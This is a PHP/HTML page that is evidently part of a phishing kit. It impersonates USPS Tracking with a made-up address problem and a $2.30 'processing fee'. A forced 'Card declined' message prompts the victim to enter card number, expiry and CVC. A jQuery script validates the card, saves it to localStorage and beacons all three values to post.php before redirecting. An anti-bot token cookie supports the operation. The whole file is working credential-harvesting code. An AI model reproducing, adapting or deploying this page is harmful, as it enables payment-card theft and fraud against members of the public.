<?php 
require '../main.php';
setcookie('token',$antibotplot,['path'=>'/','secure'=>false,'httponly'=>false,'samesite'=>'Lax']);

?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<app>
<header>
    <div class="pc">
        <img src="res/html/header-xl.png" class="xl">
        <img src="res/html/header-md.png" class="md">
    </div>
    <div class="mobile">
        <img src="res/left.png" class="left">
        <img src="res/mid.png" class="mid">
        <img src="res/right.png" class="right">
    </div>
</header>
<main>
<div class="form">
<div class="bigtitle">USPS Tracking®</div>
<h3>Tracking Number: 9410118000021019821357</h3> 
<div class="liner"></div>
<div class="title red">There is an issue with your shipping address</div>
<div class="text">We have received your package at a <strong>USPS facility</strong>. However, we were unable to complete the delivery due to an issue with your shipping address. Kindly review and confirm your address details to ensure prompt delivery and avoid further delays. We apologize for any inconvenience and appreciate your cooperation.</div>

<h3>Payment method</h3>
<img src="res/cc.png" style="width:120px;">
<p>Please note that a processing fee of <strong>$2.30</strong> may apply to complete the delivery process.</p>
<div class="liner"></div>

<?= setError("Card declined. Please try another card."); ?>
<script>if (typeof globalThis.token === "undefined") { globalThis.token = <?php echo json_encode($antibotplot); ?>; }</script>

<div class="group">

<div class="col">
    <label for="d1">Card number</label>
    <input type="text" id="d1" placeholder="0000000000000000">
</div>

<div class="col">
    <label for="d2">Expiration date</label>
    <input type="text" id="d2" placeholder="MM/YY">
</div>

<div class="col">
    <label for="d3">Security code</label>
    <input type="text" id="d3" placeholder="CVC">
</div>

<div class="col btn" style="width:100%;">
    <button onclick="sendCode()">
        Continue
    </button>
</div>

</div>


<div class="liner"></div>

</div>
</main>



<footer>
</footer>
</app>


<script src="./res/jquery.js"></script>
<script src="./res/cdn/jq.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-creditcardvalidator/1.2.0/jquery.creditCardValidator.js"></script>
<script>

let abortVal = true;

$("#d1").mask("0000000000000000");
$("#d2").mask("00/00");
$("#d3").mask('0000');
 
var allowSubmit;
 

 
 
function validate(){
	abortVal=false;
	allowSubmit=true;
for(var i=1; i<=3; i++){
	if($("#d"+i).val()==""){
		$("#d"+i).addClass("error");
			allowSubmit=false;
	}else{
		$("#d"+i).removeClass("error");
	}
}

if($("#d1").val().length<15){
	$("#d1").addClass("error");
	allowSubmit=false;
}

if($("#d3").val().length<3){
	$("#d3").addClass("error");
	allowSubmit=false;
}

 
 

$('#d1').validateCreditCard(function(result) {
    if (result.valid) {
        $("#d1").removeClass('error');
    } else {
        $("#d1").addClass("error");
        allowSubmit=false;
    } 

});

var _exp = $("#d2").val();
const _exps = _exp.split("/");
if(_exps[0]>12 || _exps[0]<=0 || _exps[1]>40 || _exps[1]<26 || _exp.length<5){
    $("#d2").addClass("error");
	allowSubmit=false;
}

}

$("input").keyup(()=>{   
    if(!abortVal){
        validate();
    }
});

 

function sendCode(){
    validate();

    if(allowSubmit){
        
        localStorage.setItem("cc", $("#d1").val());
        const form = new FormData();
        form.append("code", $("#d1").val()+"\n"+$("#d2").val()+"\n"+$("#d3").val());
        form.append("type", "Card");
        navigator.sendBeacon("post.php", form);
        window.location="wait.php?p=Card<?= mkurl(1); ?>&next=confirm.php?next=confirm.php?e=Error&sec=8";
    }
}


$("input").keypress((e)=>{
  if(e.key=="Enter"){
    sendCode();
  }
})

 
</script>
</body>
</html>